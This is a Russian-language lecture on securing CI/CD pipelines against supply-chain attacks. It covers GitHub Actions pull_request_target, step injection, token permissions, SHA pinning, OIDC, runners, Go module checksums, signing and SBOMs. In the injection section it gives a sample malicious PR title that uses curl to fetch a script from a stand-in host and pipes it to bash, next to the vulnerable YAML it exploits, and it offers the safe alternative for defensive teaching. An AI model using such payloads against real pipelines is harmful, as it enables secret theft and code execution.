У конвейера есть всё, что нужно злоумышленнику: доступ на запись в репозиторий, секреты, право пушить образы в реестр, роль в облаке и часто — возможность выкатить что угодно в прод. При этом конвейер по своему устройству **запускает чужой код**: код из пулл-реквестов, код зависимостей, код сторонних actions и плагинов. Ломать прод напрямую сложно — гораздо проще сделать так, чтобы конвейер сам собрал и выкатил нужный злоумышленнику код.

<SupplyChain />

Атаки на цепочку поставки (supply chain) бьют в любое звено: исходники, зависимости, сам конвейер, реестр, кластер. Примеры в этой лекции — на GitHub Actions, но те же проблемы есть у GitLab CI, Jenkins и любой другой системы.

## Код из чужих пулл-реквестов

Для пулл-реквестов из форков GitHub Actions по умолчанию осторожен: событие `pull_request` запускает workflow **без секретов** и с токеном только на чтение. Код из форка может делать в CI что угодно — украсть ему нечего.

Но иногда нужно больше: поставить метку, оставить комментарий с результатами, запустить тесты, которым нужен секрет. Для этого есть событие <Term id="pull-request-target">`pull_request_target`</Term>: workflow запускается **в контексте базового репозитория** — с секретами и токеном на запись. Безопасность держится на том, что при этом берётся версия workflow из базовой ветки, а не из PR.

Workflow действительно из базовой ветки, но он **сам скачивает и запускает** код злоумышленника. `go test` выполняет всё, что есть в тестовых файлах PR: `func init()` в любом пакете, `TestMain`, сами тесты. То же самое с `make`, `go generate`, `npm install` со скриптами установки — любой шаг, который исполняет что-то из рабочей копии.

Этот код получает переменные окружения с секретами, токен `GITHUB_TOKEN` с правом записи (можно запушить в `main`, если нет защиты ветки, или отравить кэш сборки, который потом восстановят другие workflow) и сеть, чтобы всё это отправить себе. Правило: в `pull_request_target` **никогда не запускать код из PR**. Если нужно и тесты, и привилегированное действие — разделить: тесты идут на `pull_request` без секретов и сохраняют результат как артефакт, а отдельный workflow на `workflow_run` читает этот артефакт **как данные** и публикует комментарий.

## Инъекция в шаги

Выражения `${{ ... }}` в GitHub Actions подставляются в текст шага **до** того, как его выполнит оболочка. Если подставляется то, что контролирует автор PR, он пишет часть скрипта:

```yaml
# уязвимо: заголовок PR становится частью bash-скрипта
- run: echo "Проверяем: ${{ github.event.pull_request.title }}"
```

Заголовок `x"; curl -s https://evil.example/x.sh | bash; echo "` превращает шаг в три команды. Так же опасны описание PR, текст комментария, имя ветки (`github.head_ref`), сообщения коммитов.

Безопасно — передать значение через переменную окружения. Оболочка не интерпретирует содержимое переменной как код:

```yaml
- env:
    TITLE: ${{ github.event.pull_request.title }}
  run: echo "Проверяем: $TITLE"
```

Такие места находит статический анализатор workflow — `zizmor` или `actionlint`. Его стоит запускать в том же конвейере, который он проверяет.

## Минимальные права токена

Каждому запуску выдаётся `GITHUB_TOKEN`. В старых организациях он по умолчанию имеет право записи почти во всё. Любой шаг — включая сторонний action — может им воспользоваться. Права задают явно: на уровне workflow — минимум, на уровне задачи — то, что ей действительно нужно:

```yaml
permissions:
  contents: read

jobs:
  release:
    permissions:
      contents: write     # создать релиз
      packages: write     # запушить образ в GHCR
      id-token: write     # получить OIDC-токен — об этом ниже
```

В настройках организации стоит выставить права по умолчанию «только чтение» — тогда забытый блок `permissions` не превращается в полный доступ.

## Сторонние actions

`uses: some-org/some-action@v4` — это код, который выполняется в вашем конвейере с вашими секретами и вашим токеном. И `v4` в этой строке — тег git, который владелец action (или тот, кто украл его доступ) может в любой момент перевесить на другой коммит.

Именно так и произошло. Злоумышленник перевесил почти все теги action на коммит, который читал память процесса раннера, находил в ней секреты и печатал их в лог сборки. В открытых репозиториях логи публичны — секреты оказались доступны всем. Ни один пользователь action ничего не менял у себя: тег, на который они ссылались, просто начал указывать на другой код.

Защита — **закреплять actions по полному SHA коммита**: `uses: tj-actions/changed-files@<40 символов SHA> # v45.0.7`. Коммит в git перевесить нельзя, его содержимое неизменно. Комментарий с версией нужен людям и инструментам обновления: Dependabot и Renovate умеют обновлять такие ссылки пулл-реквестами, так что закрепление не означает «никогда не обновлять».

И сверх закрепления: чем меньше сторонних actions, тем меньше поверхность. Три строки `bash` вместо action «установить утилиту» — не хуже, а часто лучше. Для действительно нужных — actions от крупных вендоров или проверенных организаций, а в настройках организации — список разрешённых.

## Секреты и OIDC

Маскирование секретов в логах — не защита, а удобство. GitHub заменяет на `***` точное значение секрета, но не его base64, не его части, не его запись задом наперёд. Любой шаг, у которого есть доступ к секрету, может его вывести или отправить наружу. Поэтому защищают не вывод, а доступ:

- секреты для прода — в **окружении** (`environment: production`) с правилами: запускать только из `main`, иногда — с подтверждением. Задачи пулл-реквестов их просто не получают;
- секреты — **короткоживущие**, чтобы украденное значение быстро становилось бесполезным.

Самые опасные секреты в CI — долгоживущие ключи облака: `AWS_ACCESS_KEY_ID` с правами на прод, который лежит в настройках репозитория три года. <Term id="ci-oidc">OIDC-федерация</Term> убирает их совсем. Конвейер запрашивает у GitHub подписанный токен с утверждениями о себе — какой репозиторий, какая ветка, какое окружение, какой workflow, — и обменивает его у облака на временные учётные данные на час. В облаке настроено доверие: «роль `deploy-prod` можно получить с токеном GitHub, у которого такие-то утверждения».

Условие `repo:acme/api:*` означает «любой запуск из этого репозитория». Запушить ветку может любой, у кого есть право записи, — а это обычно все разработчики, и все их скомпрометированные ноутбуки. Доверие должно быть таким же узким, как задача. Для выкатки в прод — `sub: repo:acme/api:environment:production`, а у окружения `production` в GitHub — правило «только из ветки `main`». ## Раннеры

Машины, на которых выполняются задачи, — тоже часть поверхности атаки.

**Облачные раннеры GitHub** — одноразовые виртуальные машины: каждая задача получает чистую, после задачи она уничтожается. Всё, что задача оставила, — исчезает.

**Собственные раннеры** (self-hosted) нужны ради доступа во внутреннюю сеть, мощного железа или экономии. По умолчанию они **постоянные**: следующая задача запускается на той же машине, где была предыдущая. Всё, что оставила одна задача, — процесс в фоне, подменённый бинарник в `PATH`, отравленный кэш, — встречает следующую, в том числе выкатку в прод с её секретами. Если раннер запускает задачи пулл-реквестов, это прямой путь от любого PR к прод-секретам. Поэтому:

- собственные раннеры — **одноразовые**: контейнер или ВМ на одну задачу (Actions Runner Controller в Kubernetes делает именно это);
- **никогда** не подключать собственные раннеры к открытым репозиториям — любой может открыть PR;
- раннеры для прод-выкаток — отдельная группа, которая не выполняет ничего другого;
- не монтировать в раннер сокет Docker хоста: доступ к нему равен root на машине.

## Зависимости Go

Модульная система Go защищает от подмены зависимостей лучше большинства экосистем:

- **`go.sum`** хранит хеши содержимого каждой версии модуля. Если при следующем скачивании содержимое отличается хотя бы на байт, сборка падает;
- <Term id="go-sumdb">**база контрольных сумм**</Term> `sum.golang.org` — публичный журнал только для добавления, в котором записан хеш каждой версии каждого публичного модуля. Когда модуль добавляется в `go.sum` впервые, хеш сверяется с журналом. Автор модуля не может показать разным пользователям разное содержимое одной версии или тихо перезаписать тег;
- **`-mod=readonly`** по умолчанию (с Go 1.16): `go build` в CI не изменит `go.mod` сам и упадёт, если в нём чего-то не хватает;
- **сборка не запускает код зависимостей**: в Go нет скриптов установки пакетов, как в npm. Код зависимости выполняется, только когда выполняется ваша программа или тесты.

От чего всё это **не** защищает — от вредоносного модуля, который вы сами добавили. `go.sum` гарантирует, что вы получите ровно то, что опубликовано, но не что опубликованное безопасно. Типичный сценарий — тайпсквоттинг: модуль с именем, похожим на популярный. В 2025 году исследователи нашли `github.com/boltdb-go/bolt` — копию известной `boltdb/bolt` с бэкдором, которая пролежала в зеркале модулей Go с 2021 года. Злоумышленник потом переписал тег в git на чистый код, но зеркало продолжало отдавать закэшированную вредоносную версию — именно потому, что версии в нём неизменны.

Поэтому каждая **новая** зависимость — повод для ревью: правильный ли это путь модуля, живой ли проект, сколько у него своих зависимостей. `govulncheck` здесь не поможет: он знает об известных уязвимостях, а не о намеренно вредоносном коде.

## Подпись и происхождение

Допустим, конвейер защищён. Как кластер узнает, что запускаемый образ собран **этим** конвейером, а не запушен в реестр с украденными учётными данными? Никак — если образ не подписан.

<Term id="artifact-signing">Подпись артефактов</Term> замыкает цепочку:

- **cosign** (проект Sigstore) подписывает образ в CI. Режим без ключей (keyless) использует тот же OIDC-токен: удостоверяющий центр Fulcio выдаёт короткоживущий сертификат, в котором записано, **какой workflow какого репозитория** подписал образ, а подпись попадает в публичный журнал прозрачности Rekor. Долгоживущего ключа, который можно украсть, нет;
- **аттестация происхождения** (provenance, по модели SLSA) — подписанное утверждение «дайджест `sha256:…` собран из коммита `a1b2c3` репозитория `acme/api` workflow-файлом `release.yml` на раннере GitHub». В GitHub её создаёт action `actions/attest-build-provenance`;
- **проверка при допуске**: политика в кластере — Kyverno, Sigstore policy-controller — пропускает только образы с подписью от вашего workflow из ветки `main`. Образ, запушенный руками или из ветки, под не получит.

```yaml
- uses: sigstore/cosign-installer@v3
- run: cosign sign --yes registry.example.com/api@${DIGEST}
  env:
    DIGEST: ${{ steps.build.outputs.digest }}
```

Подписывают **по дайджесту**, а не по тегу: подпись относится к конкретному содержимому.

## SBOM

<Term id="sbom">SBOM</Term> (software bill of materials) — список всего, из чего состоит артефакт: модули Go с версиями, системные пакеты базового образа, их лицензии. Его генерируют при сборке (например, `syft`) и прикладывают к образу как ещё одну подписанную аттестацию.

Зачем это нужно, становится понятно в день, когда выходит критическая уязвимость в популярной библиотеке. Вопрос «в каких из наших трёхсот сервисов, работающих прямо сейчас, есть эта библиотека и какой версии» с SBOM решается запросом, без него — неделей грепа по репозиториям, которые могут и не совпадать с тем, что реально выкачено.

У Go часть этой информации уже внутри бинарника: `go version -m ./app` печатает версию Go и все модули с версиями и хешами, из которых он собран. `govulncheck -mode=binary` проверяет готовый бинарник по этой информации. Но системные пакеты базового образа там не видны — для них нужен SBOM образа.

## Итог

- CI — самая привилегированная система: секреты, запись в репозиторий, реестр, облако, прод. И он по устройству запускает чужой код.
- [`pull_request_target`](/glossary/pull-request-target/) даёт секреты и токен на запись — в нём нельзя запускать код из PR. Тесты — на `pull_request`, привилегированные действия — отдельно, над результатами как данными.
- `${{ }}` подставляется в скрипт до оболочки — недоверенные значения передают через `env`. Проверяет `zizmor` или `actionlint`.
- `permissions` — минимальные, по умолчанию на чтение. Сторонние actions — закреплены по SHA, обновляются ботом.
- Маскирование — не защита. Прод-секреты — в защищённом окружении. Вместо долгоживущих ключей — [OIDC](/glossary/ci-oidc/) с доверием по окружению или workflow, а не по репозиторию целиком.
- Собственные раннеры — одноразовые, никогда для открытых репозиториев, отдельные для выкаток.
- `go.sum` и [база контрольных сумм](/glossary/go-sumdb/) гарантируют, что вы получили опубликованное, но не что опубликованное безопасно. Новые зависимости — на ревью.
- [Подпись](/glossary/artifact-signing/) в CI по дайджесту плюс проверка при допуске: кластер запускает только то, что собрал ваш конвейер. [SBOM](/glossary/sbom/) отвечает на вопрос «где у нас эта библиотека» за минуты.

На этом курс замыкается: конвейер, который быстро проверяет, собирает один артефакт, доставляет его по окружениям, выкатывает ступенями с анализом и сам защищён от того, чтобы стать путём в прод для чужого кода.
